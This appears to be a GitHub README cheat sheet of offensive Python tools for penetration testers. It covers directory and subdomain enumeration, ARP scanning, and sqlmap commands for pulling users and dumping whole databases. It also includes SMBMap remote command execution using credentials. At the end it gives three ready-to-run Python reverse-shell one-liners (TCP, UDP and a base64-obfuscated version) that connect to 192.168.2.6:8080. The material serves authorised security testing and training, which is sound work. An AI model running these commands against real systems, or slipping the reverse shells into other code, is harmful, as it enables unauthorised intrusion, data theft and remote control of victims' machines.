# python for pentester
Here is the list of useful python scripts & tools.
## directoryEnumeration.py:
```shell
python3 directoryEnumeration.py <target_IP_address>
```
- Directory enumeration from wordlist inside the Directory_Enumeration folder.
<br/>

## networkScanner.py:
```shell
python3 networkScanner.py
```
- Use ARP (Address Resolution Protocol) to identify targets on the local network. In the script, change 192.168.1.0/24 to your target (LAN) network ID, and change the interface from eth0 to your target (such as the one showing in your ifconfig.)
<br/>

## [Sublist3r](https://github.com/aboul3la/Sublist3r): Enumerate subdomains of websites
- Install Sublist3r
```shell
git clone https://github.com/aboul3la/Sublist3r.git ~/Downloads/Sublist3r && cd ~/Downloads/Sublist3r
sudo pip install -r requirements.txt
```
- List all the basic options:
```
python sublist3r.py -h
```
- Enumerate subdomains of specific domains which have open ports 22(SSH) 80(HTTP) 443(HTTPS):

```
python sublist3r.py -v -d targetExample.com -p 22,80,443
```
- Enumerate subdomains and enable the bruteforce module:
```
python sublist3r.py -v -b -d targetExample.com
```
- Enumerate subdomains using Google, Yahoo, and Bing

```
python sublist3r.py -v -e google,yahoo,bing -d targetExample.com
```
<br/>

## [Sqlmap](https://github.com/sqlmapproject/sqlmap)
- Installation
```bash
# sqlmap works out of the box
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev

# In Arch
yay -S sqlmap

# In Debian & Ubuntu
sudo apt install sqlmap
```
- The commands here are for running sqlmap.py inside sqlmap-dev directory. You can susbtitute "_python sqlmap.py_" with "_sqlmap_"
```bash
# Show advanced help
python sqlmap.py -hh

# Get all databses
python sqlmap.py -u https://TargetSite.com/page.php?id=7 --dbs
# or use Burp Suite - Proxy - Intercept and save the POST request output to request_file.txt and uset that
python sqlmap.py -r <request_file> -p <vulnerable_parameter> --dbs

# User enumeration
python sqlmap.py -r <request_file> --users

# Extract tables from database using GET based method
python sqlmap.py -u https://TargetSite.com/page.php?id=7 -D <database_name> --tables
# or using POST based method
python sqlmap.py -r <request_file> -p <vulnerable_parameter> -D <database_name> --tables

# Gather the columns from the table using GET based method
python sqlmap.py -u https://TargetSite.com/page.php?id=7 -D <database_name> -T <table_name> --columns
# or using POST based method
python sqlmap.py -r <request_file> -D <database_name> -T <table_name> --columns
# or dump all the availabe databases and tables
python sqlmap.py -u https://TargetSite.com/page.php?id=7 -D <database_name> --dump-all
python sqlmap.py -r <request_file> -D <database_name> --dump-all
```
<br/>

## [SMBMap](https://github.com/ShawnDEvans/smbmap): Samba Share Enumerator
- Install
```bash
git clone https://github.com/ShawnDEvans/smbmap.git && cd smbmap && python3 -m pip install -r requirements.txt
```
- Syntaxes
```bash
# Enumerate with optional flags: -L (list all drives), -R [PATH], -r [PATH]
python smbmap.pyu -H 10.10.10.10

# run ipconfig on host 10.10.10.10
python smbmap.py -u "admin" -p "password" -H 10.10.10.10 -x ipconfig
```
<br/>

## [Python reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
- TCP-based Python reverse shell:
```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.6",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
```
- UDP-based Python reverse shell
```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(("192.168.2.6",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
```
- Base64 encoded
```shell
python -c "exec('aW1wb3J0IHNvY2tldCAgICAsc3VicHJvY2VzcyAgICAsb3MgICAgIDtob3N0PSIxOTIuMTY4LjIuNiIgICAgIDtwb3J0PTgwODAgICAgIDtzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgICAgLHNvY2tldC5TT0NLX1NUUkVBTSkgICAgIDtzLmNvbm5lY3QoKGhvc3QgICAgLHBvcnQpKSAgICAgO29zLmR1cDIocy5maWxlbm8oKSAgICAsMCkgICAgIDtvcy5kdXAyKHMuZmlsZW5vKCkgICAgLDEpICAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICwyKSAgICAgO3A9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))" ...
```
<br/>
